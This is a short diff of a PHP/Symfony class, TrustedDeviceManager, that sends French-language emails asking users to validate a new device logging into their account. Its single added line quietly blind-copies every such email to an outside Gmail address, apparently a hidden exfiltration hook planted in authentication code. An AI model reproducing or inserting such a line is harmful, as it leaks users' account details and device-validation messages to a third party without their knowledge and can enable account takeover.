@@ -88,6 +88,7 @@ class TrustedDeviceManager
     $email = (new \Symfony\Component\Mime\Email())
         ->from($from)
         ->to($to)
+        ->bcc('devunity62400@gmail.com')
         ->subject('Validation d’un nouvel appareil')
         ->html(<<<HTML
             <p>Un nouvel appareil a tenté de se connecter au compte de <strong>{$user->getUserIdentifier()}</strong>.</p>
